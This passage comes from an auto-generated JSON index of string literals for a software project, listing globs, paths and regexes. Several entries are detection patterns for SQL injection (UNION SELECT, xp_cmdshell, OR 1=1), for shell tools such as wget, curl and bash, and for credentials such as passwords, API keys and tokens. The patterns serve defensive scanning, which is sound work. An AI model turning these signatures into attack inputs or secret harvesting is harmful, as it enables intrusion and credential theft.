          "value": "', metrics.name) as idx, if(idx > 0, arrayElement(metrics.value, idx), 0.0) as metric_value, if(baseline.std_val > 0, (toFloat64(metric_value) - baseline.mean_val) / baseline.std_val, 0.0) as z_score, abs(z_score) >",
          "category": "paths",
          "locations": []
        },
        "'...[/yellow]": {
          "value": "'...[/yellow]",
          "category": "paths",
          "locations": []
        },
        "'\\s*OR\\s*'": {
          "value": "'\\s*OR\\s*'",
          "category": "paths",
          "locations": []
        },
        "(# Agent Modification Tracking\\n# =+\\n(?:# .*\\n)*# =+\\n)": {
          "value": "(# Agent Modification Tracking\\n# =+\\n(?:# .*\\n)*# =+\\n)",
          "category": "paths",
          "locations": []
        },
        "(-{2}|/\\*|\\*/)": {
          "value": "(-{2}|/\\*|\\*/)",
          "category": "paths",
          "locations": []
        },
        "(.)\\1{9,}": {
          "value": "(.)\\1{9,}",
          "category": "paths",
          "locations": []
        },
        "(/\\*\\*\\n \\* Agent Modification Tracking\\n \\* =+\\n(?: \\* .*\\n)* \\* =+\\n \\*/\\n)": {
          "value": "(/\\*\\*\\n \\* Agent Modification Tracking\\n \\* =+\\n(?: \\* .*\\n)* \\* =+\\n \\*/\\n)",
          "category": "paths",
          "locations": []
        },
        "(;\\s*(DROP|DELETE|INSERT|UPDATE))": {
          "value": "(;\\s*(DROP|DELETE|INSERT|UPDATE))",
          "category": "paths",
          "locations": []
        },
        "(=\\s*\\d+|:\\s*\\d+|set to \\d+)": {
          "value": "(=\\s*\\d+|:\\s*\\d+|set to \\d+)",
          "category": "paths",
          "locations": []
        },
        "(?:command|cmd):\\s*[\\\"']?([^\\\"']+)[\\\"']?": {
          "value": "(?:command|cmd):\\s*[\\\"']?([^\\\"']+)[\\\"']?",
          "category": "paths",
          "locations": []
        },
        "(?:file|path):\\s*[\\\"']?([^\\\"'\\s]+)[\\\"']?": {
          "value": "(?:file|path):\\s*[\\\"']?([^\\\"'\\s]+)[\\\"']?",
          "category": "paths",
          "locations": []
        },
        "(?:interface|type)\\s+(\\w+)": {
          "value": "(?:interface|type)\\s+(\\w+)",
          "category": "paths",
          "locations": []
        },
        "(?:query|search):\\s*[\\\"']?([^\\\"']+)[\\\"']?": {
          "value": "(?:query|search):\\s*[\\\"']?([^\\\"']+)[\\\"']?",
          "category": "paths",
          "locations": []
        },
        "(?:url|link):\\s*[\\\"']?(https?://[^\\s\\\"']+)[\\\"']?": {
          "value": "(?:url|link):\\s*[\\\"']?(https?://[^\\s\\\"']+)[\\\"']?",
          "category": "paths",
          "locations": []
        },
        "(?<![\"\\w])(\\s*)([a-zA-Z_][a-zA-Z0-9_]*)(\\s*):": {
          "value": "(?<![\"\\w])(\\s*)([a-zA-Z_][a-zA-Z0-9_]*)(\\s*):",
          "category": "paths",
          "locations": []
        },
        "(SELECT|UPDATE|ALTER|systemctl|pg_dump|pip install)\\s+[\\w\\s\\-=.()>*]+": {
          "value": "(SELECT|UPDATE|ALTER|systemctl|pg_dump|pip install)\\s+[\\w\\s\\-=.()>*]+",
          "category": "paths",
          "locations": []
        },
        "([\\w\\.]+)\\[([^\\]]+)\\]": {
          "value": "([\\w\\.]+)\\[([^\\]]+)\\]",
          "category": "paths",
          "locations": []
        },
        "([a-zA-Z0-9._%+-]+)@([a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})": {
          "value": "([a-zA-Z0-9._%+-]+)@([a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})",
          "category": "paths",
          "locations": []
        },
        "([a-zA-Z_][a-zA-Z0-9_]*)\\s*:\\s*(\"[^\"]*\"|[^,}\\]\\s]+)": {
          "value": "([a-zA-Z_][a-zA-Z0-9_]*)\\s*:\\s*(\"[^\"]*\"|[^,}\\]\\s]+)",
          "category": "paths",
          "locations": []
        },
        "(\\b(OR|AND)\\s+1\\s*=\\s*1\\b)": {
          "value": "(\\b(OR|AND)\\s+1\\s*=\\s*1\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\b(OR|AND)\\s+\\d+\\s*=\\s*\\d+)": {
          "value": "(\\b(OR|AND)\\s+\\d+\\s*=\\s*\\d+)",
          "category": "paths",
          "locations": []
        },
        "(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\\b)": {
          "value": "(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\\b)": {
          "value": "(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|GRANT|REVOKE)\\b)": {
          "value": "(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|GRANT|REVOKE)\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\b(sp_|xp_)\\w+)": {
          "value": "(\\b(sp_|xp_)\\w+)",
          "category": "paths",
          "locations": []
        },
        "(\\bINFORMATION_SCHEMA\\b)": {
          "value": "(\\bINFORMATION_SCHEMA\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bINTO\\s+OUTFILE\\b)": {
          "value": "(\\bINTO\\s+OUTFILE\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bLOAD_FILE\\b)": {
          "value": "(\\bLOAD_FILE\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bSYS\\.\\b)": {
          "value": "(\\bSYS\\.\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bUNION\\s+(ALL\\s+)?SELECT)": {
          "value": "(\\bUNION\\s+(ALL\\s+)?SELECT)",
          "category": "paths",
          "locations": []
        },
        "(\\bUNION\\s+ALL\\s+SELECT\\b)": {
          "value": "(\\bUNION\\s+ALL\\s+SELECT\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bcat\\s+|\\btype\\s+)": {
          "value": "(\\bcat\\s+|\\btype\\s+)",
          "category": "paths",
          "locations": []
        },
        "(\\bchmod\\b|\\bchown\\b)": {
          "value": "(\\bchmod\\b|\\bchown\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\brm\\s+|\\bdel\\s+|\\brmdir\\b)": {
          "value": "(\\brm\\s+|\\bdel\\s+|\\brmdir\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bsp_executesql\\b)": {
          "value": "(\\bsp_executesql\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bwget\\b|\\bcurl\\b|\\bpowershell\\b|\\bcmd\\b|\\bsh\\b|\\bbash\\b)": {
          "value": "(\\bwget\\b|\\bcurl\\b|\\bpowershell\\b|\\bcmd\\b|\\bsh\\b|\\bbash\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bxp_cmdshell\\b)": {
          "value": "(\\bxp_cmdshell\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\bxp_cmdshell\\b|\\bsp_executesql\\b)": {
          "value": "(\\bxp_cmdshell\\b|\\bsp_executesql\\b)",
          "category": "paths",
          "locations": []
        },
        "(\\d+) deletions?\\(-\\)": {
          "value": "(\\d+) deletions?\\(-\\)",
          "category": "paths",
          "locations": []
        },
        "(\\d+) insertions?\\(\\+\\)": {
          "value": "(\\d+) insertions?\\(\\+\\)",
          "category": "paths",
          "locations": []
        },
        "(\\d+)[kK]?\\s*(?:token)?\\s*context": {
          "value": "(\\d+)[kK]?\\s*(?:token)?\\s*context",
          "category": "paths",
          "locations": []
        },
        "(\\d+)\\s*days?": {
          "value": "(\\d+)\\s*days?",
          "category": "paths",
          "locations": []
        },
        "(\\d+)\\s*months?": {
          "value": "(\\d+)\\s*months?",
          "category": "paths",
          "locations": []
        },
        "(\\d+)\\s*weeks?": {
          "value": "(\\d+)\\s*weeks?",
          "category": "paths",
          "locations": []
        },
        "(\\d+)\\s+": {
          "value": "(\\d+)\\s+",
          "category": "paths",
          "locations": []
        },
        "(\\d+)k?\\s*(?:records?|entries|rows?|samples?)": {
          "value": "(\\d+)k?\\s*(?:records?|entries|rows?|samples?)",
          "category": "paths",
          "locations": []
        },
        "(\\d+\\.\\d+(?:\\.\\d+)?)": {
          "value": "(\\d+\\.\\d+(?:\\.\\d+)?)",
          "category": "paths",
          "locations": []
        },
        "(\\d+\\.\\d+)": {
          "value": "(\\d+\\.\\d+)",
          "category": "paths",
          "locations": []
        },
        "(\\d+\\.\\d+\\.\\d+)": {
          "value": "(\\d+\\.\\d+\\.\\d+)",
          "category": "paths",
          "locations": []
        },
        "(\\d{4}-\\d{2}-\\d{2})": {
          "value": "(\\d{4}-\\d{2}-\\d{2})",
          "category": "paths",
          "locations": []
        },
        "(\\d|true|false|null)$": {
          "value": "(\\d|true|false|null)$",
          "category": "paths",
          "locations": []
        },
        "(\\w+)(\\??)\\s*:\\s*([^;,}]+)[;,]?": {
          "value": "(\\w+)(\\??)\\s*:\\s*([^;,}]+)[;,]?",
          "category": "paths",
          "locations": []
        },
        "(\\w+):\\s*([^,\\n]+)": {
          "value": "(\\w+):\\s*([^,\\n]+)",
          "category": "paths",
          "locations": []
        },
        "(\\w+):\\s*([^\\n]+)": {
          "value": "(\\w+):\\s*([^\\n]+)",
          "category": "paths",
          "locations": []
        },
        "(\\w+):\\s*[\"\\']([^\"\\']+)[\"\\']": {
          "value": "(\\w+):\\s*[\"\\']([^\"\\']+)[\"\\']",
          "category": "paths",
          "locations": []
        },
        "(\\w+)\\.(\\w+)\\[([^\\]]+)\\]": {
          "value": "(\\w+)\\.(\\w+)\\[([^\\]]+)\\]",
          "category": "paths",
          "locations": []
        },
        "(\\w+)\\s*=\\s*": {
          "value": "(\\w+)\\s*=\\s*",
          "category": "paths",
          "locations": []
        },
        "(\\w+)\\s*=\\s*Mock\\(\\)": {
          "value": "(\\w+)\\s*=\\s*Mock\\(\\)",
          "category": "paths",
          "locations": []
        },
        "(\\w+)\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']": {
          "value": "(\\w+)\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']",
          "category": "paths",
          "locations": []
        },
        "(\\w+)\\s*\\((.*)\\)$": {
          "value": "(\\w+)\\s*\\((.*)\\)$",
          "category": "paths",
          "locations": []
        },
        "(\\w+)\\s+function": {
          "value": "(\\w+)\\s+function",
          "category": "paths",
          "locations": []
        },
        "(\\w+: \\w+):\\s*\\n(\\s*\\w)": {
          "value": "(\\w+: \\w+):\\s*\\n(\\s*\\w)",
          "category": "paths",
          "locations": []
        },
        "(\\{/\\* \\n  Agent Modification Tracking\\n  =+\\n(?:  .*\\n)*  =+\\n\\*/\\}\\n)": {
          "value": "(\\{/\\* \\n  Agent Modification Tracking\\n  =+\\n(?:  .*\\n)*  =+\\n\\*/\\}\\n)",
          "category": "paths",
          "locations": []
        },
        "(access[_\\-]?token)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(access[_\\-]?token)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(api[_\\-]?key|apikey)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(api[_\\-]?key|apikey)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(async def \\w+\\([^)]*): *\\n(\\s+)": {
          "value": "(async def \\w+\\([^)]*): *\\n(\\s+)",
          "category": "paths",
          "locations": []
        },
        "(async def \\w+\\([^)]*): \\s*\\n(\\s*)": {
          "value": "(async def \\w+\\([^)]*): \\s*\\n(\\s*)",
          "category": "paths",
          "locations": []
        },
        "(async def \\w+\\([^:)]*): *\\n *([^)]+\\)):? *\\n": {
          "value": "(async def \\w+\\([^:)]*): *\\n *([^)]+\\)):? *\\n",
          "category": "paths",
          "locations": []
        },
        "(at\\s+[\\w.]+\\([^)]+\\)|Traceback|Exception in|Stack trace)": {
          "value": "(at\\s+[\\w.]+\\([^)]+\\)|Traceback|Exception in|Stack trace)",
          "category": "paths",
          "locations": []
        },
        "(authorization|auth)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(authorization|auth)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(batch_size|learning_rate|temperature|top_[pk]|max_tokens|num_beams|context_window)\\s*[=:]\\s*\\d+": {
          "value": "(batch_size|learning_rate|temperature|top_[pk]|max_tokens|num_beams|context_window)\\s*[=:]\\s*\\d+",
          "category": "paths",
          "locations": []
        },
        "(connections?|timeout|pool_size|threshold)\\s*[=:]\\s*\\d+": {
          "value": "(connections?|timeout|pool_size|threshold)\\s*[=:]\\s*\\d+",
          "category": "paths",
          "locations": []
        },
        "(def \\w+\\([^)]*): *\\n(\\s+)": {
          "value": "(def \\w+\\([^)]*): *\\n(\\s+)",
          "category": "paths",
          "locations": []
        },
        "(def \\w+\\([^)]*): \\s*\\n(\\s*)": {
          "value": "(def \\w+\\([^)]*): \\s*\\n(\\s*)",
          "category": "paths",
          "locations": []
        },
        "(def \\w+\\([^:)]*): *\\n *([^)]+\\)):? *\\n": {
          "value": "(def \\w+\\([^:)]*): *\\n *([^)]+\\)):? *\\n",
          "category": "paths",
          "locations": []
        },
        "(from datetime import[^\\n]+)": {
          "value": "(from datetime import[^\\n]+)",
          "category": "paths",
          "locations": []
        },
        "(from\\s+[\\w\\.]+\\s+import\\s+[\\w\\s,]+)\\n(\\s+[\\w\\s,]+\\n)+\\)": {
          "value": "(from\\s+[\\w\\.]+\\s+import\\s+[\\w\\s,]+)\\n(\\s+[\\w\\s,]+\\n)+\\)",
          "category": "paths",
          "locations": []
        },
        "(from|before).*\\d+.*to.*\\d+": {
          "value": "(from|before).*\\d+.*to.*\\d+",
          "category": "paths",
          "locations": []
        },
        "(import datetime\\n)": {
          "value": "(import datetime\\n)",
          "category": "paths",
          "locations": []
        },
        "(import[^;]+;[\\s]*)+": {
          "value": "(import[^;]+;[\\s]*)+",
          "category": "paths",
          "locations": []
        },
        "(increase|decrease|improve|reduce) by \\d+\\.?\\d*": {
          "value": "(increase|decrease|improve|reduce) by \\d+\\.?\\d*",
          "category": "paths",
          "locations": []
        },
        "(jwt|JWT)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(jwt|JWT)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(last\\s+\\d+\\s+\\w+|yesterday|today|this\\s+week)": {
          "value": "(last\\s+\\d+\\s+\\w+|yesterday|today|this\\s+week)",
          "category": "paths",
          "locations": []
        },
        "(latency|throughput|accuracy|precision|recall|f1).{0,20}\\d+": {
          "value": "(latency|throughput|accuracy|precision|recall|f1).{0,20}\\d+",
          "category": "paths",
          "locations": []
        },
        "(password|passwd|pwd|pass)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(password|passwd|pwd|pass)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(private[_\\-]?key)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(private[_\\-]?key)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(refresh[_\\-]?token)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(refresh[_\\-]?token)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(secret|token|bearer)[\\s:=]+\"?([^\"\\s]+)\"?": {
          "value": "(secret|token|bearer)[\\s:=]+\"?([^\"\\s]+)\"?",
          "category": "paths",
          "locations": []
        },
        "(send_agent_request\\(\\s*\\n\\s*\"[^\"]+\",\\s*\\n\\s*\"[^\"]+\",\\s*\\n\\s*[^)]+)\\n(\\s+)": {
          "value": "(send_agent_request\\(\\s*\\n\\s*\"[^\"]+\",\\s*\\n\\s*\"[^\"]+\",\\s*\\n\\s*[^)]+)\\n(\\s+)",
          "category": "paths",
          "locations": []
        },
        "(send_agent_request\\(\\s*\\n\\s*\"[^\"]+\",\\s*\\n\\s*\"[^\"]+\"\\s*)\\n(\\s+)": {
          "value": "(send_agent_request\\(\\s*\\n\\s*\"[^\"]+\",\\s*\\n\\s*\"[^\"]+\"\\s*)\\n(\\s+)",
          "category": "paths",
          "locations": []
        },
        "(step \\d+|first|second|third|finally)": {
          "value": "(step \\d+|first|second|third|finally)",
          "category": "paths",
          "locations": []
        },
        "(step \\d+|first|second|third|then|next|finally)": {
          "value": "(step \\d+|first|second|third|then|next|finally)",
          "category": "paths",
          "locations": []
        },
        "(try|if [^:]*|for [^:]*|while [^:]*|with [^:]*|async def [^:]*|def [^:]*):$\\n([^\\s])": {
          "value": "(try|if [^:]*|for [^:]*|while [^:]*|with [^:]*|async def [^:]*|def [^:]*):$\\n([^\\s])",
          "category": "paths",
          "locations": []
        },
        "(union\\s+select|union\\s+all\\s+select)": {
          "value": "(union\\s+select|union\\s+all\\s+select)",
          "category": "paths",
          "locations": []
        },
        ")\\S+\\s+import\\s+.*": {
          "value": ")\\S+\\s+import\\s+.*",
          "category": "paths",
          "locations": []
        },
        "***@\\2": {
          "value": "***@\\2",
          "category": "paths",
          "locations": []
        },
        "**/*.html": {
          "value": "**/*.html",
          "category": "paths",
          "locations": []
        },
        "**/*.json": {
          "value": "**/*.json",
          "category": "paths",
          "locations": []
        },
        "**/*.py": {
          "value": "**/*.py",
          "category": "paths",
          "locations": []
        },
        "**/*.test.ts": {
          "value": "**/*.test.ts",
          "category": "paths",
          "locations": []
        },
        "**/*.test.tsx": {
          "value": "**/*.test.tsx",
          "category": "paths",
          "locations": []
        },
        "**/*.ts": {
          "value": "**/*.ts",
          "category": "paths",
          "locations": []
        },
        "**/*.tsx": {
          "value": "**/*.tsx",
          "category": "paths",
          "locations": []
        },
        "**/*_test.py": {
          "value": "**/*_test.py",
          "category": "paths",
          "locations": []
        },
        "**/*config.json": {
          "value": "**/*config.json",
          "category": "paths",
          "locations": []
        },
        "**/*config.yaml": {
          "value": "**/*config.yaml",
          "category": "paths",
          "locations": []
        },
        "**/*config.yml": {
          "value": "**/*config.yml",
          "category": "paths",
          "locations": []
        },
        "**/.env*": {
          "value": "**/.env*",
          "category": "paths",
          "locations": []
        },
        "**/agents/**": {
          "value": "**/agents/**",
          "category": "paths",
          "locations": []
        },
        "**/auth/**": {
          "value": "**/auth/**",
          "category": "paths",
          "locations": []
        },
        "**/config.*": {
          "value": "**/config.*",
          "category": "paths",
          "locations": []
        },
        "**/docs/**": {
          "value": "**/docs/**",
          "category": "paths",
          "locations": []
        },
        "**/package.json": {
          "value": "**/package.json",
          "category": "paths",
          "locations": []
        },
        "**/payment/**": {
          "value": "**/payment/**",
          "category": "paths",
          "locations": []
        },
        "**/pyproject.toml": {
          "value": "**/pyproject.toml",
          "category": "paths",
          "locations": []
        },
        "**/requirements.txt": {
          "value": "**/requirements.txt",
          "category": "paths",
          "locations": []
        },
        "**/routes/**": {
          "value": "**/routes/**",
          "category": "paths",
          "locations": []
        },
        "**/scripts/**": {
          "value": "**/scripts/**",
          "category": "paths",
          "locations": []
        },
        "**/security/**": {
          "value": "**/security/**",
          "category": "paths",
          "locations": []
        },
        "**/services/**": {
          "value": "**/services/**",
          "category": "paths",
          "locations": []
        },
        "**/settings.*": {
          "value": "**/settings.*",
          "category": "paths",
          "locations": []
        },
        "**/supervisor*": {
          "value": "**/supervisor*",
          "category": "paths",
          "locations": []
        },
        "**/test_*.py": {
          "value": "**/test_*.py",
          "category": "paths",
          "locations": []
        },
        "**/tests/**": {
          "value": "**/tests/**",
          "category": "paths",
          "locations": []
        },
        "*.min.js": {
          "value": "*.min.js",
          "category": "paths",
          "locations": []
        },
        "*.py": {
          "value": "*.py",
          "category": "paths",
          "locations": []
        },
        "*.ts": {
          "value": "*.ts",
          "category": "paths",
          "locations": []
        },
        "*.ts,*.tsx": {
          "value": "*.ts,*.tsx",
          "category": "paths",
          "locations": []
        },
        "*.tsx": {
          "value": "*.tsx",
          "category": "paths",
          "locations": []
        },
        "*/.pytest_cache/*": {
          "value": "*/.pytest_cache/*",
          "category": "paths",
          "locations": []
        },
        "*/content_corpus.json": {
          "value": "*/content_corpus.json",
          "category": "paths",
          "locations": []
        },
        "*/tests/*": {
          "value": "*/tests/*",
          "category": "paths",
          "locations": []
        },
        "*E2E*.py": {
          "value": "*E2E*.py",
          "category": "paths",
          "locations": []
        },
        "*For questions or improvements, see the [String Literals System Documentation](../string_literals_index.xml).*": {
          "value": "*For questions or improvements, see the [String Literals System Documentation](../string_literals_index.xml).*",
          "category": "paths",
          "locations": []
        },
        "*For the complete system overview, see the [Main String Literals Index](../string_literals_index.md).*": {
          "value": "*For the complete system overview, see the [Main String Literals Index](../string_literals_index.md).*",
          "category": "paths",
          "locations": []
        },
        "*Generated by run_review.py implementing SPEC/review.xml*": {
          "value": "*Generated by run_review.py implementing SPEC/review.xml*",
          "category": "paths",
          "locations": []
        },
        "*Report saved to: team_updates/": {
          "value": "*Report saved to: team_updates/",
          "category": "paths",
          "locations": []
        },
        "*_core.py": {
          "value": "*_core.py",
          "category": "paths",
          "locations": []
        },
        "*_critical.py": {
          "value": "*_critical.py",
          "category": "paths",
          "locations": []
        },
        "*_fixtures.py": {
          "value": "*_fixtures.py",
          "category": "paths",
          "locations": []
        },
        "*_helpers.py": {
          "value": "*_helpers.py",
          "category": "paths",
          "locations": []
        },
        "*_managers.py": {
          "value": "*_managers.py",
          "category": "paths",
          "locations": []
        },
        "*_services.py": {
          "value": "*_services.py",
          "category": "paths",
          "locations": []
        },
        "*_sub_agent.py": {
          "value": "*_sub_agent.py",
          "category": "paths",
          "locations": []
        },
        "*_test.py": {
          "value": "*_test.py",
          "category": "paths",
          "locations": []
        },
        "*_utils.py": {
          "value": "*_utils.py",
          "category": "paths",
          "locations": []
        },
        "*e2e*.py": {
          "value": "*e2e*.py",
          "category": "paths",
          "locations": []
        },
        "*test*.py": {
          "value": "*test*.py",
          "category": "paths",
          "locations": []
        },
        "*test*.ts": {
          "value": "*test*.ts",
          "category": "paths",
          "locations": []
        },
        "+$50/month infrastructure": {
          "value": "+$50/month infrastructure",
          "category": "paths",
          "locations": []
        },
        ",\\s*([}\\]])": {
          "value": ",\\s*([}\\]])",
          "category": "paths",
          "locations": []
        },
        ",\\s*]": {
          "value": ",\\s*]",
          "category": "paths",
          "locations": []
        },
        ",\\s*}": {
          "value": ",\\s*}",
          "category": "paths",
          "locations": []
        },
        ",https://netra-frontend-jmujvwwf7q-uc.a.run.app": {
          "value": ",https://netra-frontend-jmujvwwf7q-uc.a.run.app",
          "category": "paths",
          "locations": []
        },
        "- CI/CD: pytest -m 'not real_services'": {
          "value": "- CI/CD: pytest -m 'not real_services'",
          "category": "paths",
          "locations": []
        },
        "- Strategic/Revenue Impact:": {
          "value": "- Strategic/Revenue Impact:",
          "category": "paths",
          "locations": []
        },
        "- app/tests/mock_tests/": {
          "value": "- app/tests/mock_tests/",
          "category": "paths",
          "locations": []
        },
        "- app/tests/real_services/": {
          "value": "- app/tests/real_services/",
          "category": "paths",
          "locations": []
        },
        "- ⚙️ [Scan for New Literals](../../scripts/scan_string_literals.py)": {
          "value": "- ⚙️ [Scan for New Literals](../../scripts/scan_string_literals.py)",
          "category": "paths",
          "locations": []
        },
        "- 🏠 [Back to Main Index](../string_literals_index.md)": {
          "value": "- 🏠 [Back to Main Index](../string_literals_index.md)",
          "category": "paths",
          "locations": []
        },
        "- 📂 [Browse Categories by File](string_literals/)": {
          "value": "- 📂 [Browse Categories by File](string_literals/)",
          "category": "paths",
          "locations": []
        },
        "- 📂 [Browse Other Categories](./)": {
          "value": "- 📂 [Browse Other Categories](./)",
          "category": "paths",
          "locations": []
        },
        "- 🔍 [Query String Literals](../../scripts/query_string_literals.py)": {
          "value": "- 🔍 [Query String Literals](../../scripts/query_string_literals.py)",
          "category": "paths",
          "locations": []
        },
        "--\\s*$": {
          "value": "--\\s*$",
          "category": "paths",
          "locations": []
        },
        "--\\w+": {
          "value": "--\\w+",
          "category": "paths",
          "locations": []
        },
        "--ignore-glob=*conftest.py": {
          "value": "--ignore-glob=*conftest.py",
          "category": "paths",
          "locations": []
        },
        "--include=*.py": {
          "value": "--include=*.py",
          "category": "paths",
          "locations": []
        },
        "--include=*.ts": {
          "value": "--include=*.ts",
          "category": "paths",
          "locations": []
        },
        "-docker.pkg.dev/": {
          "value": "-docker.pkg.dev/",
          "category": "paths",
          "locations": []
        },
        ".\n        \n        Should complete in <30 seconds for CI/CD.\n        \"\"\"\n        start_time = time.time()\n        \n        # Basic validation\n        assert test_containers is not None\n        \n        # Quick functionality check\n        # Implementation based on test type\n        \n        duration = time.time() - start_time\n        assert duration < 30, f\"Smoke test took {duration:.2f}s (max: 30s)\"\n\n\n@pytest.mark.asyncio\n@pytest.mark.integration\nclass Test": {
          "value": ".\n        \n        Should complete in <30 seconds for CI/CD.\n        \"\"\"\n        start_time = time.time()\n        \n        # Basic validation\n        assert test_containers is not None\n        \n        # Quick functionality check\n        # Implementation based on test type\n        \n        duration = time.time() - start_time\n        assert duration < 30, f\"Smoke test took {duration:.2f}s (max: 30s)\"\n\n\n@pytest.mark.asyncio\n@pytest.mark.integration\nclass Test",
          "category": "paths",
          "locations": []
        },
        ". Falling back to default corpus.[/red]": {
          "value": ". Falling back to default corpus.[/red]",
          "category": "paths",
          "locations": []
        },
        ". This endpoint expects JSON-RPC format, not regular JSON. Use /ws for regular JSON messages.": {
          "value": ". This endpoint expects JSON-RPC format, not regular JSON. Use /ws for regular JSON messages.",
          "category": "paths",
          "locations": []
        },
        ".*?(?=\\ndef|\\Z)": {
          "value": ".*?(?=\\ndef|\\Z)",
          "category": "paths",
          "locations": []
        },
        ".*\\.apps\\.googleusercontent\\.com": {
          "value": ".*\\.apps\\.googleusercontent\\.com",
          "category": "paths",
          "locations": []
        },
        ".*\\.git.*": {
          "value": ".*\\.git.*",
          "category": "paths",
          "locations": []
        },
        ".*\\.herokuapp\\.com.*": {
          "value": ".*\\.herokuapp\\.com.*",
          "category": "paths",
          "locations": []
        },
        ".*\\.localtunnel\\.me.*": {
          "value": ".*\\.localtunnel\\.me.*",
          "category": "paths",
          "locations": []
        },
        ".*\\.ngrok\\.io.*": {
          "value": ".*\\.ngrok\\.io.*",
          "category": "paths",
          "locations": []
        },
        ".*\\.pyc$": {
          "value": ".*\\.pyc$",
          "category": "paths",
          "locations": []
        },
        ".*\\.pyo$": {
          "value": ".*\\.pyo$",
          "category": "paths",
          "locations": []
        },
        ".*\\.spec\\.[jt]sx?$": {
          "value": ".*\\.spec\\.[jt]sx?$",
          "category": "paths",
          "locations": []
        },
        ".*\\.test\\.[jt]sx?$": {
          "value": ".*\\.test\\.[jt]sx?$",
          "category": "paths",
          "locations": []
        },
        ".*\\.venv.*": {
          "value": ".*\\.venv.*",
          "category": "paths",
          "locations": []
        },
        ".*\\d+\\.\\d+\\.\\d+\\.\\d+.*": {
          "value": ".*\\d+\\.\\d+\\.\\d+\\.\\d+.*",
          "category": "paths",
          "locations": []
        },
        ".*_test\\.py$": {
          "value": ".*_test\\.py$",
          "category": "paths",
          "locations": []
        },
        ".*auth_constants\\.py$": {
          "value": ".*auth_constants\\.py$",
          "category": "paths",
          "locations": []
        },
        ".*chrome-extension://.*": {
          "value": ".*chrome-extension://.*",
          "category": "paths",
          "locations": []
        },
        ".*localhost.*:(?!3000|3001|3002|3003|4000|4001|4200|5173|5174|8000|8001|8002|8003|8080|8081|8082|8083)\\d+.*": {
          "value": ".*localhost.*:(?!3000|3001|3002|3003|4000|4001|4200|5173|5174|8000|8001|8002|8003|8080|8081|8082|8083)\\d+.*",
          "category": "paths",
          "locations": []
        },
        ".*moz-extension://.*": {
          "value": ".*moz-extension://.*",
          "category": "paths",
          "locations": []
        },
        "../setup/websocket-test-utils": {
          "value": "../setup/websocket-test-utils",
          "category": "paths",
          "locations": []
        },
        "../test-utils": {
          "value": "../test-utils",
          "category": "paths",
          "locations": []
        },
        "./.env": {
          "value": "./.env",
          "category": "paths",
          "locations": []
        },
        ".//category[@id='component_health']": {
          "value": ".//category[@id='component_health']",
          "category": "paths",
          "locations": []
        },
        ".//category[@id='work_in_progress']": {
          "value": ".//category[@id='work_in_progress']",
          "category": "paths",
          "locations": []
        },
        ".//check": {
          "value": ".//check",
          "category": "paths",
          "locations": []
        },
        ".//learning": {
          "value": ".//learning",
          "category": "paths",
          "locations": []
        },
        "./test-utils": {
          "value": "./test-utils",
          "category": "paths",
          "locations": []
        },
        ".git/hooks/pre-commit": {
          "value": ".git/hooks/pre-commit",
          "category": "paths",
          "locations": []
        },
        ".github/workflows": {
          "value": ".github/workflows",
          "category": "paths",
          "locations": []
        },
        ".github/workflows/": {
          "value": ".github/workflows/",
          "category": "paths",
          "locations": []
        },
        ".github/workflows/boundary-enforcement.yml": {
          "value": ".github/workflows/boundary-enforcement.yml",
          "category": "paths",
          "locations": []
        },
        ".github/workflows/local-ACT-workflows": {
          "value": ".github/workflows/local-ACT-workflows",
          "category": "paths",
          "locations": []
        },
        ".github/workflows/pending": {
          "value": ".github/workflows/pending",
          "category": "paths",
          "locations": []
        },
        ".js": {
          "value": ".js",
          "category": "paths",
          "locations": []
        },
        ".netra/error_db.sqlite": {
          "value": ".netra/error_db.sqlite",
          "category": "paths",
          "locations": []
        },
        ".netra/migration_state.json": {
          "value": ".netra/migration_state.json",
          "category": "paths",
          "locations": []
        },
        ".netra/startup_status.json": {
          "value": ".netra/startup_status.json",
          "category": "paths",
          "locations": []
        },
        ".py": {
          "value": ".py",
          "category": "paths",
          "locations": []
        },
        ".pytest_cache/": {
          "value": ".pytest_cache/",
          "category": "paths",
          "locations": []
        },
        ".test.js": {
          "value": ".test.js",
